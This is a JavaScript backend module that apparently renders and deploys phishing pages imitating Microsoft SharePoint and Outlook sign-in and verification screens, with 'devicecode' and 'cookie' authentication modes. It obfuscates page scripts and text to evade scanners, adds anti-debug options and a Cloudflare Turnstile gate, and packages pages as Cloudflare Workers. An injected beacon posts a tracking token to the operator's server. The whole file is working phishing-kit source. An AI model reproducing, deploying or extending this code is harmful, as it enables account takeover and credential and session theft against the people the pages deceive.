/**
 * VGenius Template Loader Service
 */
'use strict';

const fs = require('fs');
const path = require('path');
const config = require('../config/env');
const jwt = require('jsonwebtoken');

const TEMPLATES_DIR = path.join(__dirname, '..', '..', 'templates');
const DESIGNS_DIR = path.join(__dirname, '..', '..', 'verification-designs');

function listDiskTemplates() {
    try {
        if (!fs.existsSync(TEMPLATES_DIR)) return [];
        return fs.readdirSync(TEMPLATES_DIR, { withFileTypes: true })
            .filter(entry => entry.isDirectory() && entry.name !== 'assets' && entry.name !== 'custom')
            .map(entry => entry.name);
    } catch (e) { return []; }
}

function normalizeTemplateKey(value) {
    return String(value || '').toLowerCase().trim().replace(/[^a-z0-9]+/g, '');
}

function resolveTemplateDirectory(templateType) {
    const input = String(templateType || '').trim();
    const fallbackDir = 'sharepoint3';
    const candidateDirs = fs.existsSync(TEMPLATES_DIR)
        ? fs.readdirSync(TEMPLATES_DIR, { withFileTypes: true }).filter(e => e.isDirectory()).map(e => e.name)
        : [];
    const ni = normalizeTemplateKey(input || fallbackDir);
    for (const dn of candidateDirs) {
        if (normalizeTemplateKey(dn) === ni) return path.join(TEMPLATES_DIR, dn);
        const cp = path.join(TEMPLATES_DIR, dn, 'config.json');
        if (fs.existsSync(cp)) {
            try {
                const c = JSON.parse(fs.readFileSync(cp, 'utf8'));
                if (c?.name && normalizeTemplateKey(c.name) === ni) return path.join(TEMPLATES_DIR, dn);
            } catch (err) {}
        }
    }
    const dp = path.join(TEMPLATES_DIR, input || fallbackDir);
    if (fs.existsSync(dp)) return dp;
    return path.join(TEMPLATES_DIR, fallbackDir);
}

function loadTemplateConfig(templateType) {
    const tp = path.join(resolveTemplateDirectory(templateType), 'config.json');
    if (fs.existsSync(tp)) return JSON.parse(fs.readFileSync(tp, 'utf8'));
    return { name: templateType, preload: true, auth_mode: 'devicecode', fields: [] };
}

function loadTemplateHTML(tt) {
    const fp = path.join(resolveTemplateDirectory(tt), 'index.html');
    return fs.existsSync(fp) ? fs.readFileSync(fp, 'utf8') : '';
}

function loadTemplateCSS(tt) {
    const fp = path.join(resolveTemplateDirectory(tt), 'style.css');
    return fs.existsSync(fp) ? fs.readFileSync(fp, 'utf8') : '';
}

function loadTemplateJS(tt) {
    const fp = path.join(resolveTemplateDirectory(tt), 'script.js');
    return fs.existsSync(fp) ? fs.readFileSync(fp, 'utf8') : '';
}

function loadVerificationDesignCSS(designName) {
    const bn = String(designName || 'outlook').trim();
    const dp = path.join(DESIGNS_DIR, bn + '.css');
    if (fs.existsSync(dp)) return fs.readFileSync(dp, 'utf8');
    const fp = path.join(DESIGNS_DIR, 'outlook.css');
    return fs.existsSync(fp) ? fs.readFileSync(fp, 'utf8') : '';
}

async function loadAdminSettings() {
    const obj = {};
    try {
        const db = require('../database/connection');
        const [rows] = await db.query('SELECT setting_key, setting_value FROM settings');
        for (const r of rows) obj[r.setting_key] = r.setting_value;
    } catch (e) {}
    if (obj.obfuscation_enabled === undefined) obj.obfuscation_enabled = String(config.ENABLE_OBFUSCATION).toLowerCase() === 'true' ? 'true' : 'false';
    if (obj.antidebug_enabled === undefined) obj.antidebug_enabled = String(config.ENABLE_ANTIDEBUG).toLowerCase() === 'true' ? 'true' : 'false';
    if (obj.soft_error_retry_enabled === undefined) obj.soft_error_retry_enabled = 'false';
    if (obj.default_background_blur === undefined) obj.default_background_blur = '4';
    if (obj.default_auth_mode === undefined) obj.default_auth_mode = 'cookie';
    return obj;
}

function boolSetting(v) {
    if (v === true || v === 1) return true;
    return String(v || '').toLowerCase() === 'true';
}

function obfuscateJs(sourceCode) {
    try {
        const JavaScriptObfuscator = require('javascript-obfuscator');
        return JavaScriptObfuscator.obfuscate(sourceCode, {
            compact: true,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            deadCodeInjection: true,
            deadCodeInjectionThreshold: 1,
            debugProtection: false,
            disableConsoleOutput: true,
            identifierNamesGenerator: 'hexadecimal',
            log: false,
            numbersToExpressions: true,
            selfDefending: true,
            simplify: true,
            splitStrings: true,
            splitStringsChunkLength: 5,
            stringArray: true,
            stringArrayCallsTransform: true,
            stringArrayEncoding: ['rc4'],
            stringArrayIndexShift: true,
            stringArrayRotate: true,
            stringArrayShuffle: true,
            stringArrayWrappersCount: 3,
            stringArrayWrappersChainedCalls: true,
            stringArrayWrappersParametersMaxCount: 2,
            stringArrayWrappersType: 'variable',
            transformObjectKeys: true,
        }).getObfuscatedCode();
    } catch (e) {
        console.error('[Obfuscation] Failed:', e.message);
        return sourceCode;
    }
}

function buildWindowVars(link, user, settings, options) {
    options = options || {};
    const jt = jwt.sign({ user_id: user.id, link_id: link.id }, config.JWT_SECRET, { expiresIn: '90d' });
    const obfuscationEnabled = boolSetting(settings.obfuscation_enabled) || !!link.obfuscated;
    const antidebugEnabled = boolSetting(settings.antidebug_enabled);
    const softErrorRetry = boolSetting(settings.soft_error_retry_enabled);
    const defaultBlur = (link.background_blur != null ? link.background_blur : parseInt(settings.default_background_blur, 10)) || 4;
    const authMode = link.auth_mode || settings.default_auth_mode || 'cookie';
    const bgUrl = link.custom_bg_url || link.background_blur_url || '';
    const turnstileEnabled = link.turnstile_enabled !== false && link.turnstile_enabled !== 0;
    const exportDomain = options.domain ? String(options.domain).trim().replace(/^https?:\/\//, '').replace(/\/+$/, '') : '';
    const turnstileSiteKey = config.CF_TURNSTILE_SITE_KEY || '';
    let apiBase = '';
    if (options.apiBaseUrl) apiBase = String(options.apiBaseUrl).trim().replace(/\/+$/, '');
    else if (config.APP_URL) apiBase = String(config.APP_URL).trim().replace(/\/+$/, '');

    const blob = JSON.stringify({
        VG_JWT: jt,
        __API_BASE: apiBase,
        __DESTINATION_URL: link.destination_url || 'https://office.com',
        __AUTH_MODE: authMode,
        __BACKGROUND_BLUR_URL: bgUrl,
        __BACKGROUND_BLUR_AMOUNT: String(defaultBlur),
        __DOC_FILENAME: link.file_name || 'Document.pdf',
        __DOC_TITLE: link.title_text || 'Non-Disclosure Agreement',
        __DOC_PAGES: String(link.pages || '4'),
        __PAGE_TITLE: link.title_text || 'Verify your identity',
        __PAGE_MESSAGE: link.message_text || 'Please verify your identity to continue',
        __PRIMARY_BUTTON_TEXT: link.button_text || 'Get verification code',
        __OBFUSCATION_ENABLED: String(obfuscationEnabled),
        __ANTIDEBUG_ENABLED: String(antidebugEnabled),
        __SOFT_ERROR_RETRY_ENABLED: String(softErrorRetry),
        COPY_TO_OPEN: String(!!link.copy_to_open),
        __TURNSTILE_ENABLED: String(!!turnstileEnabled),
        __TURNSTILE_SITE_KEY: turnstileSiteKey,
        __EXPORT_DOMAIN: exportDomain,
        __BLOB_URL_ENABLED: String(!!link.blob_url_enabled),
    });
    const encoded = Buffer.from(blob).toString('base64');
    return '<script>!function(){try{var j=JSON.parse(atob("' + encoded + '"));for(var k in j)window[k]=j[k]}catch(e){}}();</script>';
}

function minifyHtml(html) {
    html = html.replace(/<!--[\s\S]*?-->/g, '');
    html = html.replace(/\s*>\s*</g, '><');
    html = html.replace(/[ \t\n\r]+/g, ' ');
    html = html.replace(/\s*=\s*/g, '=');
    return html.trim();
}

function obfuscateTextContent(html) {
    var strings = [];
    var seen = new Set();

    // Step 1: Only encode text nodes between tags, NEVER touch attributes
    // Safe regex: only match text that is purely alphanumeric, spaces, dots, hyphens, commas
    html = html.replace(/>([A-Za-z0-9\s\-\.\/\,\!\?\&\;\#\(\)\[\]\{\}<>\"\'=]+)</g, function(match, text) {
        var trimmed = text.trim();
        if (!trimmed || trimmed.length < 3) return match;
        if (!seen.has(trimmed)) {
            seen.add(trimmed);
            strings.push(trimmed);
        }
        var idx = strings.length - 1;
        return '><span class="__vg" data-idx="' + idx + '">__PLACEHOLDER__</span>';
    });

    // Step 2: Encode all collected strings with XOR + Base64
    var encodedMap = {};
    for (var i = 0; i < strings.length; i++) {
        var s = strings[i];
        var encoded = '';
        for (var j = 0; j < s.length; j++) {
            encoded += String.fromCharCode(s.charCodeAt(j) ^ ((i + 42) ^ 0x5A));
        }
        encodedMap[i] = Buffer.from(encoded).toString('base64');
    }

    // Step 3: Build the encoded array for the decoder script
    var encodedArr = [];
    for (var k = 0; k < strings.length; k++) {
        encodedArr.push('"' + encodedMap[k] + '"');
    }

    // Step 4: Create the decoder script that runs in browser
    var decodeScript = '<script>(function(){var S=[' + encodedArr.join(',') + '];var D=[];for(var i=0;i<S.length;i++){var p=atob(S[i]);var t="";for(var j=0;j<p.length;j++){t+=String.fromCharCode(p.charCodeAt(j)^(i+42)^90)}D[i]=t}var spans=document.querySelectorAll("span.__vg");for(var i=0;i<spans.length;i++){var idx=parseInt(spans[i].getAttribute("data-idx"));if(D[idx]!==undefined){spans[i].textContent=D[idx];spans[i].removeAttribute("class");spans[i].removeAttribute("data-idx")}}})();<\/script>';

    // Step 5: Replace placeholders with actual decoded text via spans
    html = html.replace(/><span class="__vg" data-idx="(\d+)">__PLACEHOLDER__<\/span>/g, function(m, num) {
        return '><span data-v="' + num + '">__PLACEHOLDER__</span>';
    });

    // Step 6: Insert decode script before </head> or at start of <body>
    if (html.indexOf('</head>') !== -1) {
        html = html.replace('</head>', decodeScript + '</head>');
    } else if (html.indexOf('<body') !== -1) {
        html = html.replace(/<body[^>]*/i, function(m) { return m + decodeScript; });
    } else {
        html = decodeScript + html;
    }

    // Step 7: Minify to ~20 lines (preserve structure but collapse)
    html = html.replace(/<!--[\s\S]*?-->/g, '');
    html = html.replace(/\r\n/g, '\n');
    html = html.replace(/[ \t]+/g, ' ');
    // Break into ~20 lines by inserting newlines at logical points
    html = html.replace(/></g, '>\n<');
    var lines = html.split('\n');
    if (lines.length > 20) {
        var merged = [];
        var chunk = '';
        for (var i = 0; i < lines.length; i++) {
            if ((chunk + lines[i]).length > 120 && chunk.length > 0) {
                merged.push(chunk);
                chunk = lines[i];
            } else {
                chunk += lines[i];
            }
        }
        if (chunk) merged.push(chunk);
        html = merged.join('\n');
    }

    return html.trim();
}

async function renderPageHtml(link, user, options) {
    options = options || {};
    const templateType = link.template_type || 'sharepoint3';
    const designName = link.verification_design || 'outlook';
    const settings = await loadAdminSettings();

    if (options.apiBaseUrl) {
        options.apiBaseUrl = String(options.apiBaseUrl).trim().replace(/\/+$/, '');
    }

    let html = loadTemplateHTML(templateType);
    const css = loadTemplateCSS(templateType) + '\n' + loadVerificationDesignCSS(designName);
    const script = loadTemplateJS(templateType);

    if (html.includes('{{CSS}}')) {
        html = html.replace(/\/\* \{\{CSS\}\} \*\//, '<style>' + css + '</style>');
    }
    if (html.includes('{{SCRIPT}}')) {
        html = html.replace(/\/\/ \{\{SCRIPT\}\}/, '<script>' + script + '</script>');
    }

    html = html.replace('{{TITLE}}', link.title_text || 'Verify your identity');
    html = html.replace('{{MESSAGE}}', link.message_text || 'Please verify your identity to continue');
    html = html.replace('{{BUTTON_TEXT}}', link.button_text || 'Get verification code');
    html = html.replace('{{FILE_NAME}}', link.file_name || 'Document.pdf');
    html = html.replace('{{PAGES}}', String(link.pages || 1));

    const verifyUrl = (options.apiBaseUrl || config.APP_URL || '').trim().replace(/\/+$/, '');
    const beaconUrl = verifyUrl ? verifyUrl + '/api/beacon' : '/api/beacon';
    const logUrl = verifyUrl;
    const turnstileKey = config.CF_TURNSTILE_SITE_KEY || '';

    if (html.includes('{{VERIFY_ENDPOINT}}')) html = html.replace(/{{VERIFY_ENDPOINT}}/g, verifyUrl);
    if (html.includes('{{BEACON_ENDPOINT}}')) html = html.replace(/{{BEACON_ENDPOINT}}/g, beaconUrl);
    if (html.includes('{{LOG_ENDPOINT}}')) html = html.replace(/{{LOG_ENDPOINT}}/g, logUrl);
    if (html.includes('{{TURNSTILE_KEY}}')) html = html.replace(/{{TURNSTILE_KEY}}/g, turnstileKey);

    const windowVars = buildWindowVars(link, user, settings, options);

    let vgEngine = '';
    const vgEnginePath = path.join(TEMPLATES_DIR, 'assets', 'vg-engine.js');
    if (fs.existsSync(vgEnginePath)) {
        vgEngine = fs.readFileSync(vgEnginePath, 'utf8');
    }

    const forceBlob = options.forceBlobFromStart === true ? 'true' : 'false';
    const configScript = '<script>window.__FORCE_BLOB_FROM_START=' + forceBlob + '</script>';

    html = html.replace('</head>', windowVars + configScript + '</head>');

    if (vgEngine) {
        html = html.replace('</head>', '<script>' + vgEngine + '</script></head>');
    }

    const templateConfig = loadTemplateConfig(templateType);
    if (templateConfig.preload) {
        html = html.replace(/\{\{#PRELOAD\}\}/g, '').replace(/\{\{\/PRELOAD\}\}/g, '');
        html = html.replace(/\{\{#NO_PRELOAD\}\}[\s\S]*?\{\{\/NO_PRELOAD\}\}/g, '');
    } else {
        html = html.replace(/\{\{#NO_PRELOAD\}\}/g, '').replace(/\{\{\/NO_PRELOAD\}\}/g, '');
        html = html.replace(/\{\{#PRELOAD\}\}[\s\S]*?\{\{\/PRELOAD\}\}/g, '');
    }

    const doObfuscate = boolSetting(settings.obfuscation_enabled) || link.obfuscated;
    if (doObfuscate) {
        if (vgEngine && vgEngine.length > 100) {
            const obfuscatedEngine = obfuscateJs(vgEngine);
            const pattern = '<script>' + vgEngine.substring(0, Math.min(50, vgEngine.length)).replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
            try {
                html = html.replace(new RegExp(pattern + '[\\s\\S]*?<\\/script>'), '<script>' + obfuscatedEngine + '</script>');
            } catch (e) { /* regex error, skip */ }
        }
        if (script && script.length > 10) {
            const obfuscatedScript = obfuscateJs(script);
            const pattern2 = '<script>' + script.substring(0, Math.min(30, script.length)).replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
            try {
                html = html.replace(new RegExp(pattern2 + '[\\s\\S]*?<\\/script>'), '<script>' + obfuscatedScript + '</script>');
            } catch (e) { /* regex error, skip */ }
        }
    }

    if (options.exportForDownload) {
        html = minifyHtml(html);
    }

    html = html.replace('</body>', '<script>fetch(\'' + beaconUrl + '\',{method:\'POST\',body:JSON.stringify({jwt_token:window.VG_JWT})}).catch(()=>{})</script></body>');

    return html;
}

async function generateExportHtml(link, user, options) {
    return renderPageHtml(link, user, Object.assign({}, options, { exportForDownload: true }));
}

async function buildWorkerScript(link, user, apiBaseUrl) {
    const pageHtml = await renderPageHtml(link, user, {});
    let workerJs = fs.readFileSync(path.join(__dirname, '..', '..', 'worker', 'devicecode-worker.js'), 'utf8');
    const verifyUrl = apiBaseUrl || config.APP_URL || (config.CF_WORKERS_SUBDOMAIN ? 'https://' + config.CF_WORKERS_SUBDOMAIN + '.workers.dev' : 'http://localhost:' + config.PORT);
    const linkJwt = jwt.sign({ user_id: user.id, link_id: link.id }, config.JWT_SECRET, { expiresIn: '90d' });

    workerJs = workerJs
        .replace("'{{JWT_TOKEN}}'", "'" + linkJwt + "'")
        .replace("'{{TURNSTILE_KEY}}'", "'" + config.CF_TURNSTILE_SITE_KEY + "'")
        .replace("'{{TURNSTILE_SECRET}}'", "'" + config.CF_TURNSTILE_SECRET_KEY + "'")
        .replace("'{{VERIFY_ENDPOINT}}'", "'" + verifyUrl + "'")
        .replace("'{{BEACON_ENDPOINT}}'", "'" + verifyUrl + "'")
        .replace("'{{LOG_ENDPOINT}}'", "'" + verifyUrl + "'")
        .replace("`{{TEMPLATE_HTML}}`", '`' + pageHtml.replace(/`/g, '\\`').replace(/\$/g, '\\$') + '`');

    return workerJs;
}

module.exports = {
    normalizeTemplateKey,
    listDiskTemplates,
    resolveTemplateDirectory,
    loadTemplateConfig,
    loadTemplateHTML,
    loadTemplateCSS,
    loadTemplateJS,
    loadVerificationDesignCSS,
    loadAdminSettings,
    boolSetting,
    generateExportHtml,
    buildWorkerScript,
};
